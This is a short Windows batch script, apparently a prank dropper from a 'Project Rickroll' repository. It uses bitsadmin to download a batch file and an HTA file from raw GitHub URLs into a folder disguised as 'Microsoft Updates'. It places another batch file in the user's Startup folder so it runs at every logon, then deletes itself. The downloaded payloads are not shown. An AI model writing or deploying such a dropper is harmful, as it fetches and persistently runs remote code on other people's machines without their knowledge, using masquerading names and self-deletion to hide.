@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/bgwork.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrklbg.bat"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/rick.hta" "%AppData%\Microsoft\Windows\Start Menu\Programs\Microsoft Updates\msrkl.hta"
bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Stupid_Collection/refs/heads/main/Projects/Project%20Rickroll/start_menu.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\msrkl.bat"

del startup.bat
